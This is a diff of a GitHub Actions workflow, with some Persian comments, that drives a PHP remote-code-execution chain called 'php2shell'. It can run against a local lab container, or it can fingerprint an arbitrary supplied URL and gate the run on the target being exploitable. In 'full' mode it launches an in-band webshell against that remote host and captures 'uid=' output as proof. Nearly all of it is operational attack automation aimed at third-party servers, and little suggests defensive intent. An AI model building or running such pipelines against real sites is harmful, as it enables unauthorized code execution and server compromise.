@@ -10,15 +10,15 @@ on:
         type: choice
         options: [lab, recon, full]
       target:
-        description: "Full URL with path, e.g. https://example.com/index.php"
+        description: "Full URL with scheme, e.g. https://example.com/index.php"
         required: false
         default: ""
       target_offsets_env:
-        description: "full mode only: 'ZIF_OFFSET=0x.. DTOR_OFFSET=0x..'"
+        description: "full only: 'ZIF_OFFSET=0x.. DTOR_OFFSET=0x..' (or two lines)"
         required: false
         default: ""
       retries:
-        description: "chain retries"
+        description: "chain retries (int)"
         required: false
         default: "3"
       dbg:
@@ -42,148 +42,264 @@ jobs:
       TARGET: ${{ inputs.target }}
       OFF: ${{ inputs.target_offsets_env }}
       RETRIES: ${{ inputs.retries }}
+      MODE: ${{ inputs.mode }}
     steps:
       - uses: actions/checkout@v4
 
-      # ---------- PRE-FLIGHT: همیشه لاگ کامل بگیر ----------
-      - name: Pre-flight — dump run context
+      # ---------- PRE-FLIGHT ----------
+      - name: Pre-flight - context
+        if: always()
         run: |
           set -euo pipefail
           {
-            echo "mode     : ${{ inputs.mode }}"
-            echo "target   : ${TARGET:-<empty>}"
-            echo "retries  : ${RETRIES:-3}"
-            echo "runner   : $(uname -m) / $(lsb_release -ds 2>/dev/null || true)"
-            echo "python   : $(python3 --version)"
+            echo "### pre-flight"
+            echo "- mode: \`${MODE}\`"
+            echo "- target: \`${TARGET:-<empty>}\`"
+            echo "- retries: \`${RETRIES:-3}\`"
+            echo "- arch: \`$(uname -m)\`"
+            echo "- os: \`$(lsb_release -ds 2>/dev/null || uname -sr)\`"
+            echo "- python: \`$(python3 --version 2>&1)\`"
+            echo "- docker: \`$(docker --version 2>&1 || echo none)\`"
           } | tee context.txt
+          cat context.txt >> "$GITHUB_STEP_SUMMARY"
 
-      # ---------- GUARD: پیام انگلیسی، فرمت ولید، راهنما همراه ----------
-      - name: Guard — validate inputs
+      # ---------- GUARDS ----------
+      - name: Guard - target
         if: inputs.mode != 'lab'
         run: |
           set -euo pipefail
           if [ -z "$TARGET" ]; then
-            echo "FAIL: input 'target' is empty."
-            echo "HOW TO FIX: Run workflow again and fill the 'target' field."
-            echo "  Example: https://example.com/index.php"
-            echo "  Mode 'recon' = passive fingerprinting, Mode 'full' = active chain."
-            echo "::error::input 'target' is empty - re-run and fill the target URL field"
+            echo "FAIL: input 'target' is empty"
+            echo "::error title=guard::input 'target' is empty - re-run and fill the target URL"
             exit 1
           fi
-          # URL must parse: scheme + host
-          python3 - "$TARGET" <<'EOF'
+          python3 - "$TARGET" <<'PY'
           import sys, urllib.parse
-          u = urllib.parse.urlparse(sys.argv[1])
-          assert u.scheme in ("http", "https") and u.hostname, f"bad URL: {sys.argv[1]}"
-          print(f"parsed OK: host={u.hostname} port={u.port} path={u.path or '/'} tls={u.scheme=='https'}")
-          EOF
+          raw = sys.argv[1]
+          u = urllib.parse.urlparse(raw)
+          if u.scheme not in ("http", "https") or not u.hostname:
+              print(f"::error title=guard::bad URL '{raw}' - need scheme+host, e.g. https://example.com/index.php")
+              raise SystemExit(1)
+          try:
+              port = u.port
+          except ValueError:
+              print(f"::error title=guard::bad port in '{raw}'")
+              raise SystemExit(1)
+          print(f"parsed OK host={u.hostname} port={port} path={u.path or '/'} tls={u.scheme=='https'}")
+          PY
 
-      - name: Guard — full mode needs offsets
+      - name: Guard - retries is int
+        run: |
+          set -euo pipefail
+          case "$RETRIES" in
+            ''|*[!0-9]*) echo "::error title=guard::'retries' must be a positive integer (got '${RETRIES}')"; exit 1;;
+          esac
+          [ "$RETRIES" -ge 1 ] || { echo "::error title=guard::'retries' must be >= 1"; exit 1; }
+          echo "retries OK: $RETRIES"
+
+      - name: Guard - full needs offsets
         if: inputs.mode == 'full'
         run: |
           set -euo pipefail
           if [ -z "$OFF" ]; then
-            echo "FAIL: mode=full requires target build offsets."
-            echo "HOW TO FIX: on a host running the SAME PHP build, extract:"
-            echo "  docker cp <container>:/usr/lib/apache2/modules/libphp.so /tmp/l.so"
+            echo "FAIL: mode=full requires target build offsets"
+            echo "HOW TO FIX: on a host with the SAME PHP build:"
+            echo "  docker cp <ctr>:/usr/lib/apache2/modules/libphp.so /tmp/l.so"
             echo "  python3 -c \"from lib.offsets import extract_from_elf; z,d=extract_from_elf('/tmp/l.so'); print(f'ZIF_OFFSET=0x{z:x} DTOR_OFFSET=0x{d:x}')\""
-            echo "::error::mode=full requires target_offsets_env input"
+            echo "::error title=guard::mode=full requires target_offsets_env"
             exit 1
           fi
 
-      # ---------- RECON (سخت‌گیرانه، سه‌لایه) ----------
-      - name: Recon — raw HTTP headers (fallback evidence)
+      # ---------- RECON ----------
+      - name: Recon - raw headers
         if: inputs.mode == 'recon'
+        timeout-minutes: 3
         run: |
-          set -euo pipefail
-          # حتی اگر exploit.py بمیرد، ما هدر خام داریم
-          curl -sS -D - -o headers-body.txt --max-time 20 "$TARGET" | tee raw-headers.txt
-          echo "--- response headers above; body first 500 bytes: ---"
-          head -c 500 headers-body.txt || true
-
-      - name: Recon — exploit.py JSON fingerprint
-        if: inputs.mode == 'recon'
-        run: |
-          set -euo pipefail
-          # بدون tee مستقیم؛ خروجی را اول در فایل بگیر تا JSON حتی در شکست حفظ شود
-          if python3 exploit.py -t "$TARGET" --recon-only --output json > exploit-recon.json 2> exploit-recon.err; then
-            echo "exploit.py recon: OK"
-          else
-            echo "::warning::exploit.py recon exited non-zero - check exploit-recon.err"
+          set -uo pipefail
+          curl -sS -L -k --compressed --max-time 20 --retry 2 \
+               -A 'Mozilla/5.0 (X11; Linux x86_64) php2shell-recon' \
+               -D raw-headers.txt -o headers-body.txt "$TARGET"
+          rc=$?
+          echo "curl rc=$rc"
+          if [ "$rc" -ne 0 ]; then
+            echo "::warning title=curl::curl exited $rc - headers may be incomplete"
           fi
-          cat exploit-recon.json 2>/dev/null || true
-          cat exploit-recon.err   2>/dev/null || true
-
-      - name: Recon — standalone recon.py (risk score)
-        if: inputs.mode == 'recon'
-        run: |
-          set -euo pipefail
-          python3 recon.py "$TARGET" 2>&1 | tee recon-report.txt || true
-
-      - name: Recon — verdict to step summary
-        if: inputs.mode == 'recon'
-        run: |
-          set -euo pipefail
+          set -e
+          echo "::group::response headers"; cat raw-headers.txt; echo "::endgroup::"
+          echo "::group::body head"; head -c 600 headers-body.txt | tr -d '\0'; echo; echo "::endgroup::"
           {
-            echo "## Recon report — $TARGET"
-            echo '```'
-            cat recon-report.txt 2>/dev/null || echo "(recon-report missing)"
-            echo '```'
+            echo "### raw response headers"
+            echo '```'; cat raw-headers.txt 2>/dev/null || echo "(none)"; echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Recon - fingerprint via exploit.py
+        if: inputs.mode == 'recon'
+        timeout-minutes: 5
+        run: |
+          set -uo pipefail
+          STAMP="$(date +%s)"
+          case "$TARGET" in *\?*) SEP='&';; *) SEP='?';; esac
+          URL="${TARGET}${SEP}cb=${STAMP}"
+          echo "probing: $URL"
+
+          timeout 180 python3 exploit.py -t "$URL" --recon-only \
+            --output json --timeout 20 \
+            > exploit-recon.raw 2> exploit-recon.err
+          rc=$?
+          echo "exploit.py rc=$rc"
+
+          # بنر + متن verbose را از JSON جدا کن
+          python3 - <<'PY'
+          raw = open("exploit-recon.raw", encoding="utf-8", errors="replace").read()
+          i = raw.rfind("\n{")
+          i = 0 if i < 0 else i + 1
+          open("exploit-recon.json", "w").write(raw[i:].strip() + "\n")
+          PY
+
+          echo "::group::stdout"; cat exploit-recon.raw; echo "::endgroup::"
+          echo "::group::stderr"; cat exploit-recon.err; echo "::endgroup::"
+
+          if ! python3 -c 'import json;json.load(open("exploit-recon.json"))' 2> json.err; then
+            msg="$(tail -n 15 exploit-recon.err | tr '\n' ' ' | tr -d '\r' | sed 's/%/%25/g' | cut -c1-500)"
+            echo "::error title=recon produced no valid JSON::exit=${rc} | ${msg:-no stderr}"
+            {
+              echo '#### recon FAILED - no valid JSON'
+              echo "exit=\`${rc}\`"
+              echo '```'; cat exploit-recon.raw exploit-recon.err json.err 2>/dev/null; echo '```'
+            } >> "$GITHUB_STEP_SUMMARY"
+            exit 1
+          fi
+
+      - name: Recon - raw fingerprint via module
+        if: inputs.mode == 'recon'
+        timeout-minutes: 4
+        run: |
+          set -uo pipefail
+          timeout 120 python3 - "$TARGET" > recon-report.txt 2>&1 <<'PY'
+          import sys, urllib.parse
+          from recon import fingerprint
+          u = urllib.parse.urlparse(sys.argv[1])
+          info = fingerprint(u.hostname, u.port or (443 if u.scheme == "https" else 80),
+                             u.path or "/", u.scheme == "https")
+          print(info.summary())
+          print("--- raw fields ---")
+          for k, v in sorted(vars(info).items()):
+              print(f"{k} = {v!r}")
+          PY
+          echo "rc=$?"
+          cat recon-report.txt
+
+      - name: Recon - verdict + gate
+        if: inputs.mode == 'recon'
+        run: |
+          set -uo pipefail
+          {
+            echo "## recon verdict"
             echo '```json'
-            cat exploit-recon.json 2>/dev/null || echo "{}"
+            cat exploit-recon.json
+            echo '```'
+            echo '### fingerprint'
+            echo '```'
+            cat recon-report.txt 2>/dev/null || echo "(missing)"
             echo '```'
           } >> "$GITHUB_STEP_SUMMARY"
 
-      # ---------- LAB / FULL (از نسخه قبلی، با همان فیکس‌های خودت) ----------
-      - name: Lab — start target
+          VULN="$(python3 -c 'import json;print(json.load(open("exploit-recon.json")).get("vulnerable"))')"
+          SAPI="$(python3 -c 'import json;print(json.load(open("exploit-recon.json")).get("sapi") or "unknown")')"
+          UPLOAD="$(python3 -c 'import json;print(json.load(open("exploit-recon.json")).get("upload_progress"))')"
+
+          echo "vulnerable=${VULN} sapi=${SAPI} upload_progress=${UPLOAD}"
+          echo "::notice title=recon::vulnerable=${VULN} sapi=${SAPI}"
+
+          if [ "$VULN" != "True" ]; then
+            echo "::error title=recon::vulnerable=${VULN} - target does not look exploitable"
+            exit 1
+          fi
+          if [ "$SAPI" != "apache2handler" ]; then
+            echo "::warning title=sapi::sapi=${SAPI} - php2shell targets mod_php; FPM needs another path"
+          fi
+          if [ "$UPLOAD" != "True" ]; then
+            echo "::error title=recon::session.upload_progress disabled - chain precondition missing"
+            exit 1
+          fi
+
+      # ---------- LAB ----------
+      - name: Lab - start target
         if: inputs.mode == 'lab'
+        timeout-minutes: 5
         run: |
           set -euo pipefail
           mkdir -p out && chmod +x lab.sh
           ./lab.sh
           sudo chmod 777 out
+          { echo '### lab target'; echo '```'; docker exec php2shell-target php -v 2>&1 | head -1; echo '```'; } >> "$GITHUB_STEP_SUMMARY"
 
-      - name: Lab — extract offsets
+      - name: Lab - extract offsets
         if: inputs.mode == 'lab'
         run: |
           set -euo pipefail
-          python3 -c "from lib.offsets import extract_from_container, save_offsets_env; z,d=extract_from_container('php2shell-target'); save_offsets_env('out/offsets.env',z,d); print(f'zif=0x{z:x} dtor=0x{d:x}')"
+          python3 -c "from lib.offsets import extract_from_container, save_offsets_env; z,d=extract_from_container('php2shell-target'); save_offsets_env('out/offsets.env',z,d); print(f'zif=0x{z:x} dtor=0x{d:x}')" | tee offsets.log
+          cat offsets.log >> "$GITHUB_STEP_SUMMARY"
 
-      - name: Lab — run chain
+      - name: Lab - run chain
         if: inputs.mode == 'lab'
+        timeout-minutes: 15
         run: |
           set -euo pipefail
-          python3 exploit.py -t http://127.0.0.1:18110/index.php \
+          timeout 600 python3 exploit.py -t http://127.0.0.1:18110/index.php \
             --cmd "(id; uname -a)" \
             --offsets-env out/offsets.env \
             --restart php2shell-target \
             --retries "$RETRIES" \
-            --out-dir out
+            --out-dir out \
+            --timeout 30 | tee chain.log
 
-      - name: Lab — verify proof
+      - name: Lab - verify proof
         if: inputs.mode == 'lab'
         run: |
           set -euo pipefail
-          grep -q "uid=" out/.p2s_result
-          echo "PROOF: $(cat out/.p2s_result)"
+          if [ ! -s out/.p2s_result ]; then
+            echo "::error title=proof::out/.p2s_result missing or empty - chain did not reach B2"
+            { echo '#### lab FAILED'; echo '```'; tail -n 60 chain.log; echo '```'; } >> "$GITHUB_STEP_SUMMARY"
+            exit 1
+          fi
+          grep -q "uid=" out/.p2s_result || {
+            echo "::error title=proof::no uid= in output - got: $(head -c 200 out/.p2s_result | tr '\n' ' ')"
+            exit 1
+          }
+          echo "PROOF OK"
+          { echo '#### lab PROOF'; echo '```'; cat out/.p2s_result; echo '```'; } >> "$GITHUB_STEP_SUMMARY"
 
-      - name: Full — write + validate offsets
+      # ---------- FULL ----------
+      - name: Full - normalize offsets
         if: inputs.mode == 'full'
         run: |
           set -euo pipefail
-          mkdir -p out
-          # هر دو کلید ممکن را به فرمت استاندارد normalize کن
-          echo "$OFF" | tr ' ' '\n' | grep -E '^(ZIF|DTOR)_OFFSET=0x[0-9a-fA-F]+$' > target-offsets.env
-          echo "--- normalized offsets ---"; cat target-offsets.env
+          printf '%s\n' "$OFF" | tr -d '\r' | tr -s '[:space:]' '\n' \
+            | grep -E '^(ZIF|DTOR)_OFFSET=0x[0-9a-fA-F]+$' > target-offsets.env || true
+          cat target-offsets.env
+          grep -q '^ZIF_OFFSET='  target-offsets.env || { echo "::error title=offsets::ZIF_OFFSET missing or malformed"; exit 1; }
+          grep -q '^DTOR_OFFSET=' target-offsets.env || { echo "::error title=offsets::DTOR_OFFSET missing or malformed"; exit 1; }
+          { echo '#### offsets'; echo '```'; cat target-offsets.env; echo '```'; } >> "$GITHUB_STEP_SUMMARY"
 
-      - name: Full — chain (in-band webshell)
+      - name: Full - chain (in-band webshell)
         if: inputs.mode == 'full'
+        timeout-minutes: 20
         run: |
           set -euo pipefail
-          python3 exploit.py -t "$TARGET" \
+          STAMP="$(date +%s)"
+          case "$TARGET" in *\?*) SEP='&';; *) SEP='?';; esac
+          URL="${TARGET}${SEP}cb=${STAMP}"
+          timeout 900 python3 exploit.py -t "$URL" \
             --cmd "id" --mode webshell \
             --offsets-env target-offsets.env \
-            --retries "$RETRIES"
+            --retries "$RETRIES" --timeout 40 | tee full.log
+          if grep -q "uid=" full.log; then
+            { echo '#### full PROOF'; echo '```'; grep "uid=" full.log; echo '```'; } >> "$GITHUB_STEP_SUMMARY"
+          else
+            echo "::error title=full::no uid= in output - chain did not complete"
+            exit 1
+          fi
 
       # ---------- EVIDENCE ----------
       - name: Upload evidence
@@ -195,15 +311,20 @@ jobs:
             context.txt
             raw-headers.txt
             headers-body.txt
+            exploit-recon.raw
             exploit-recon.json
             exploit-recon.err
             recon-report.txt
+            chain.log
+            full.log
+            offsets.log
             out/
             target-offsets.env
           include-hidden-files: true
           if-no-files-found: warn
-          retention-days: 1
+          retention-days: 7
 
       - name: Debug SSH on failure
         if: failure() && inputs.dbg
+        timeout-minutes: 20
         uses: mxschmitt/action-tmate@v3
